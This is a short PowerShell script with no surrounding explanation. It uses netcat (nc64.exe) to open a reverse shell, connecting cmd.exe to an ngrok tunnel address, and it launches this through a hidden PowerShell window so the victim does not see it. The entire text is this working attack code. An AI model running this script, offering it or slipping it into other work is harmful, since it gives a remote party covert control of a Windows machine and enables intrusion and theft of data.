$command = ".\nc64.exe 0.tcp.eu.ngrok.io 14573 -e cmd.exe"
Start-Process "powershell.exe" -ArgumentList "-NoProfile -Command `"& { $command }`"" -WindowStyle Hidden
